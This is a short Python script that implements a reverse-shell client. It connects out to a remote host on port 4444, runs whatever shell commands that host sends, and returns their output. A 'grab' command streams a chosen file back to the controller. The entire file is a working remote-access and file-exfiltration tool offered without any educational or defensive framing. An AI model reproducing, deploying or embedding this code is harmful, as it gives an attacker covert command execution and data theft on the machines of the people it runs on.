import socket
import subprocess
import os
import click


def transfer(s, path):
    if os.path.exists(path):
        f = open(path, 'rb')
        packet = f.read(1024)
        while len(packet) > 0:
            s.send(packet)
            packet = f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())


@click.command()
@click.option('--host', default='127.0.0.1')
@click.option('--port', default=4444)
def connect(host, port):
    s = socket.socket()
    s.connect((host, port))
    while True:
        command = s.recv(1024)
        if 'terminate' in command.decode():
            s.close()
            break
        if 'grab' in command.decode():
            grab, path = command.decode().split(" ")
            try:
                transfer(s, path)
            except:
                pass
        else:
            cmd = subprocess.Popen(command.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())

    s.close()


if __name__ == '__main__':
    connect()
